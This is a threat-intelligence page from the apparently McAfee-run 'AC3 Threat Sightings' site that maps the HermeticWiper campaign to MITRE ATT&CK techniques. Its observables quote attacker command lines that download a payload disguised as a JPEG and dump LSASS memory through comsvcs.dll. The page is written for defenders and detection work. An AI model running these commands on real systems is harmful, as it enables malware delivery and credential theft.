<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<title data-react-helmet="true">HermeticWiper | AC3 - Threat Sightings</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/HermeticWiper"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="HermeticWiper | AC3 - Threat Sightings"><meta data-react-helmet="true" name="description" content="Overview"><meta data-react-helmet="true" property="og:description" content="Overview"><link data-react-helmet="true" rel="shortcut icon" href="/ac3-threat-sightings/img/ma-favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/HermeticWiper"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/HermeticWiper" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/HermeticWiper" hreflang="x-default"><link rel="stylesheet" href="/ac3-threat-sightings/assets/css/styles.9f78bae8.css">
<link rel="preload" href="/ac3-threat-sightings/assets/js/runtime~main.c07ad03c.js" as="script">
<link rel="preload" href="/ac3-threat-sightings/assets/js/main.a21a4089.js" as="script">
</head>
<body data-theme="light">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/ac3-threat-sightings/"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--light_4Vu1 navbar__logo"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--dark_uzRr navbar__logo"><b class="navbar__title">AC3 Threat Sightings</b></a><a class="navbar__item navbar__link navbar__link--active" href="/ac3-threat-sightings/docs/Welcome">Home</a></div><div class="navbar__items navbar__items--right"><div class="react-toggle toggle_2i4l react-toggle--disabled"><div class="react-toggle-track" role="button" tabindex="-1"><div class="react-toggle-track-check"><span class="toggle_iYfV">ðŸŒœ</span></div><div class="react-toggle-track-x"><span class="toggle_iYfV">ðŸŒž</span></div><div class="react-toggle-thumb"></div></div><input type="checkbox" class="react-toggle-screenreader-only" aria-label="Switch between dark and light mode"></div><div class="dsla-search-wrapper"><div class="dsla-search-field"></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button class="clean-btn backToTopButton_i9tI" type="button"><svg viewBox="0 0 24 24" width="28"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" fill="currentColor"></path></svg></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh menuWithAnnouncementBar_+O1J"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Welcome">AC3 Threat Sightings</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Getting Started</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#">Sightings</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Darkside_Ransomware">Darkside_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Diavol_Ransomware">Diavol_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Conti_Ransomware">Conti_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/BlackCat_Ransomware">BlackCat_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer">Jupyter_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer">Raccoon_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Guildma_RAT">Guildma_RAT</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware">LemonDuck_Malware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/UNK-Credential_Access">UNK-Credential_Access</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/TA551-Phishing">TA551-Phishing</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/UNK-Phishing">UNK-Phishing</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/HermeticWiper">HermeticWiper</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/WhisperGate">WhisperGate</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Hafnium">Hafnium</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Tortillas_Babuk">Tortillas_Babuk</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021">Emotet_Dec2021</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Older Schema Version</a></li></ul></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Weapons</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Techniques</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Stats">Stats</a></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_eoK2"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_e+kA"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>HermeticWiper</h1></header><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="overview"></a>Overview<a class="hash-link" href="#overview" title="Direct link to heading">#</a></h2><p>This Threat Sighting documents observed TTPs for HermeticWiper destructive malware. This Threat Sighting is based on public reports. It was discovered being deployed in Ukraine in 2022. After deleting volume shadow copies the malware abuses a legitimate EaseUS driver to destroy data on Windows systems.</p><p>This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: <a href="https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml" target="_blank" rel="noopener noreferrer">https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml</a></p><p>Author: Alejandro Houspanossian (@lekz86)</p><p>Acknowledgements: @TalosSecurity, Qualys Threat Research, Symantec&#x27;s @threatintel, @TrellixLabs</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="references"></a>References:<a class="hash-link" href="#references" title="Direct link to heading">#</a></h3><ul><li><a href="https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/" target="_blank" rel="noopener noreferrer">https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/</a></li><li><a href="https://blog.talosintelligence.com/2022/02/threat-advisory-hermeticwiper.html" target="_blank" rel="noopener noreferrer">https://blog.talosintelligence.com/2022/02/threat-advisory-hermeticwiper.html</a></li><li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia" target="_blank" rel="noopener noreferrer">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/01/ukrainian-targets-hit-by-hermeticwiper-new-datawiper-malware" target="_blank" rel="noopener noreferrer">https://blog.qualys.com/vulnerabilities-threat-research/2022/03/01/ukrainian-targets-hit-by-hermeticwiper-new-datawiper-malware</a></li><li><a href="https://www.trellix.com/en-au/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html" target="_blank" rel="noopener noreferrer">https://www.trellix.com/en-au/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-activity"></a>Threat Actor Activity<a class="hash-link" href="#threat-actor-activity" title="Direct link to heading">#</a></h3><ul><li>Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.</li><li>Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.</li><li>Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.</li><li>Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.</li><li>Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.</li><li>Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.</li><li>HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.</li><li>HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.</li><li>HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.</li><li>HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.</li><li>HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.</li><li>HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.</li><li>HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="count-of-documented-ttps-by-tactic"></a>Count of documented TTPs by Tactic<a class="hash-link" href="#count-of-documented-ttps-by-tactic" title="Direct link to heading">#</a></h3><table><thead><tr><th>Tactic</th><th># Documented TTPs</th></tr></thead><tbody><tr><td>Lateral Movement</td><td>+ (1)</td></tr><tr><td>Persistence</td><td>+ (1)</td></tr><tr><td>Discovery</td><td>+ (1)</td></tr><tr><td>Credential Access</td><td>+ (1)</td></tr><tr><td>Execution</td><td>+ (1)</td></tr><tr><td>Privilege Escalation</td><td>+ (1)</td></tr><tr><td>Command And Control</td><td>++ (2)</td></tr><tr><td>Defense Evasion</td><td>++ (2)</td></tr><tr><td>Impact</td><td>+++ (3)</td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="attack-flow"></a>Attack Flow<a class="hash-link" href="#attack-flow" title="Direct link to heading">#</a></h3><p>The chart below shows a graphical representation of the attack flow.</p><div class="mermaid">
graph LR
EXE[Execution] --&gt; | likely _WMI_ and _Impacket_ to execute _CMD_ commands on victim endpoints| C2[Command And Control]
EXE[Execution] --&gt; | _PowerShell_ to download malware masqueraded as _.jpeg_ file from _internal server_| LatM[Lateral Movement]
EXE[Execution] --&gt; | _SCHTASKS_ to periodically create malicious file at Windows Policy Definition folder| PER[Persistence]
EXE[Execution] --&gt; | _CERTUTIL_ to check internet connectivity| D[Discovery]
EXE[Execution] --&gt; | _PowerShell_ to download additional malware masqueraded as _jpeg_ file from external server| C2[Command And Control]
EXE[Execution] --&gt; | _COM+ Service DLL_ to dump _LSASS_ process memory via _RunDll32_ and _PowerShell_| CA[Credential Access]
EXE[Execution] --&gt; | _valid digital signatures_ to undermine security controls| DE[Defense Evasion]
EXE[Execution] --&gt; | _embedded resources_ to stage _EaseUS Partition Master_ drivers| DE[Defense Evasion]
DE[Defense Evasion] --&gt; | _Native APIs_ to execute the drivers as a _Windows Service_| EXE[Execution]
EXE[Execution] --&gt; | _AdjustTokenPrivileges_ Native API to give itself _SeLoadDriverPrivilege_, _SeShutDownPrivilege_ and _SeBackupPrivilege_ privileges| PE[Privilege Escalation]
EXE[Execution] --&gt; | _Native APIs_ to stop the Volume Shadow Copy Service| IMP[Impact]
DE[Defense Evasion] --&gt; | _EaseUS Partition Master_ drivers for direct access to storage devices to overwrite files| IMP[Impact]
EXE[Execution] --&gt; | _InitiateSystemShutdownEx_ Native API to shutdown the system| IMP[Impact]
</div><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-and-procedures"></a>Tactics, Techniques and Procedures<a class="hash-link" href="#tactics-techniques-and-procedures" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th></tr></thead><tbody><tr><td>Command And Control</td><td>T1047 - Windows Management Instrumentation<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.</td></tr><tr><td>Lateral Movement</td><td>T1570 - Lateral Tool Transfer<br>T1059.001 - Command and Scripting Interpreter: PowerShell</td><td>Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.</td></tr><tr><td>Persistence</td><td>T1053.005 - Scheduled Task/Job: Scheduled Task<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.</td></tr><tr><td>Discovery</td><td>T1071.001 - Application Layer Protocol: Web Protocols</td><td>Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.</td></tr><tr><td>Command And Control</td><td>T1071.001 - Application Layer Protocol: Web Protocols</td><td>Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.</td></tr><tr><td>Credential Access</td><td>T1059.003 - Command and Scripting Interpreter: Windows Command Shell<br>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1218.011 - Signed Binary Proxy Execution: Rundll32<br>T1003.001 - OS Credential Dumping: LSASS Memory</td><td>Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.</td></tr><tr><td>Defense Evasion</td><td>T1553.002 - Subvert Trust Controls: Code Signing</td><td>HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1140 - Deobfuscate/Decode Files or Information</td><td>HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.</td></tr><tr><td>Execution</td><td>T1106 - Native API<br>T1543 - Create or Modify System Process: Windows Service<br>T1569.002 - System Services: Service Execution<br>T1112 - Modify Registry</td><td>HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.</td></tr><tr><td>Privilege Escalation</td><td>T1106 - Native API<br>T1134 - Access Token Manipulation</td><td>HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.</td></tr><tr><td>Impact</td><td>T1106 - Native API<br>T1490 - Inhibit System Recovery</td><td>HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.</td></tr><tr><td>Impact</td><td>T1561.002 - Disk Structure Wipe<br>T1561.001 - Disk Content Wipe</td><td>HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.</td></tr><tr><td>Impact</td><td>T1106 - Native API<br>T1529 - System Shutdown/Reboot</td><td>HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-procedures-observables-and-notes"></a>Tactics, Techniques, Procedures, Observables and Notes<a class="hash-link" href="#tactics-techniques-procedures-observables-and-notes" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th><th>Observables</th><th>Notes</th></tr></thead><tbody><tr><td>Command And Control</td><td>T1047<br>T1059.003</td><td>Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.</td><td><em>Process Created</em>: <br>- <code>cmd.exe /Q /c powershell -c \&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;hxxp://192.168.3.13/email.jpeg&#x27;,&#x27;CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1&#x27;)\&quot;&gt; \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2&gt;&amp;1</code><br>- <code>cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1&gt; \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2&gt;&amp;1</code><br>- <code>cmd.exe /Q /c powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot; 1&gt; \\127.0.0.1\ADMIN$\__1638457529.1247072 2&gt;&amp;1</code></td><td>- Patterns in the command-line arguments is consistent with Impackets <em>wmiexec.py</em> script.<br>- <em>Impacket</em> is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.<br>- <em>Impacket</em> contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.<br>- <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></td></tr><tr><td>Lateral Movement</td><td>T1570<br>T1059.001</td><td>Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.</td><td><em>Process Created</em>: <br>- <code>powershell -c \&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;hxxp://192.168.3.13/email.jpeg&#x27;,&#x27;CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1&#x27;)\&quot;&gt; \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2&gt;&amp;1</code></td><td>- &quot;CSIDL_SYSTEM_DRIVE&quot; is not on the list of recognized environment variables.<br>- <a href="https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables</a></td></tr><tr><td>Persistence</td><td>T1053.005<br>T1059.003</td><td>Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.</td><td><em>Process Created</em>: <br>- <code>schtasks /run /tn \&quot;\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\&quot;</code><br><em>Process Created</em>: <br>- <code>cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1&gt; \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2&gt;&amp;1</code></td><td></td></tr><tr><td>Discovery</td><td>T1071.001</td><td>Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.</td><td><em>DNS Queried</em>: <code>trustsecpro[.]com</code><br><em>DNS Queried</em>: <code>whatismyip[.]com</code></td><td></td></tr><tr><td>Command And Control</td><td>T1071.001</td><td>Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.</td><td><em>DNS Queried</em>: <code>confluence.novus[.]ua</code></td><td></td></tr><tr><td>Credential Access</td><td>T1059.003<br>T1059.001<br>T1218.011<br>T1003.001</td><td>Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.</td><td><em>Process Created</em>: <br>- <code>cmd.exe /Q /c powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot; 1&gt; \\127.0.0.1\ADMIN$\__1638457529.1247072 2&gt;&amp;1</code><br><em>Process Created</em>: <br>- <code>powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot;</code><br><em>Process Created</em>: <br>- <code>rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full</code></td><td>- <em>comsvcs.dll</em> is the <em>COM+ Service DLL</em> in Windows.<br>- <em>comsvcs.dll MimiDump</em> method is used to create processes memory dumps.<br>- The target process is provided as argument; in this case is pId = 600.<br>- Using <em>comsvcs.dll MimiDump</em> for creating LSASS process memory dumps is a known trick.</td></tr><tr><td>Defense Evasion</td><td>T1553.002</td><td>HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.</td><td><em>File Created</em>: <br>- <code>*\\#{binaryName}.exe</code></td><td>- Code signing provides a level of authenticity on a binary from the developer.</td></tr><tr><td>Defense Evasion</td><td>T1140</td><td>HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.</td><td><em>File Created</em>: <br>- <code>C:\\Windows\\System32\\drivers\\fndr.sys</code><br>- <code>C:\\Windows\\System32\\drivers\\njdr.sys</code></td><td>- 4 versions of the drivers are included in the resources.<br>- The drivers are compressed using the <em>MSLZ</em> format.<br>- Only one driver is written to disk with partially randomized file name.<br>- File name follows the pattern: &quot;[a-z]{2}dr.sys&quot;</td></tr><tr><td>Execution</td><td>T1106<br>T1543<br>T1569.002<br>T1112</td><td>HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.</td><td><em>RegValue Created</em>: <code>HKLM\\SYSTEM\\CurrentControlSet\\services\\#[a-z]{2}dr</code></td><td></td></tr><tr><td>Privilege Escalation</td><td>T1106<br>T1134</td><td>HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.</td><td></td><td>- An access token is a type of object that describes the security context of a process or thread, and is assigned to all processes created in the system.<br>- <em>SeLoadDriverPrivilege</em>: Allows to Load and unload device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space.<br>- <em>SeShutDownPrivilege</em>: Allows to shutdown local system. Ransomware and wipers might rely on this for larger impact.<br>- <em>SeBackupPrivilege</em>: Allows to read files even when such right is not specified on the Access Control List. Ransomware and wipers might rely on this for larger impact.<br>- <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/</a><br>- <a href="https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88" target="_blank" rel="noopener noreferrer">https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88</a></td></tr><tr><td>Impact</td><td>T1106<br>T1490</td><td>HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.</td><td></td><td>- The VSS service creates incremental back-ups over time. It&#x27;s is often disabled by ransomware and wipers.<br>- An alternative method is to use <em>SC.EXE</em> to disable VSS service.</td></tr><tr><td>Impact</td><td>T1561.002<br>T1561.001</td><td>HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.</td><td></td><td>- MBR (Master Boot Record) is located on first 512 bytes each drive.<br>- Target folders: C:\Documents and Settings\, C:\System Volume Information\, C:\Windows\SYSVOL\, C:\Windows\System32\winevt\Logs, C:\Windows\System32\winevt\Logs</td></tr><tr><td>Impact</td><td>T1106<br>T1529</td><td>HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.</td><td></td><td>- This API requires <em>SeShutDownPrivilege</em> privilege.</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="ttp-profiles-with-observables"></a>TTP Profiles with Observables<a class="hash-link" href="#ttp-profiles-with-observables" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-likely-wmi-and-impacket-to-execute-cmd-commands-on-victim-endpoints-for-command-and-control"></a>Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.<a class="hash-link" href="#threat-actor-used-likely-wmi-and-impacket-to-execute-cmd-commands-on-victim-endpoints-for-command-and-control" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic"></a>Tactic<a class="hash-link" href="#tactic" title="Direct link to heading">#</a></h4><ul><li>Command And Control</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques"></a>Techniques<a class="hash-link" href="#techniques" title="Direct link to heading">#</a></h4><ul><li>T1047 - Windows Management Instrumentation</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1047<br>T1059.003</td><td><em>CMD</em> executions with command-line patterns similar to <em>Impacket</em>.</td><td><em>Process Created</em>: <br>- <code>cmd.exe /Q /c powershell -c \&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;hxxp://192.168.3.13/email.jpeg&#x27;,&#x27;CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1&#x27;)\&quot;&gt; \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2&gt;&amp;1</code><br>- <code>cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1&gt; \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2&gt;&amp;1</code><br>- <code>cmd.exe /Q /c powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot; 1&gt; \\127.0.0.1\ADMIN$\__1638457529.1247072 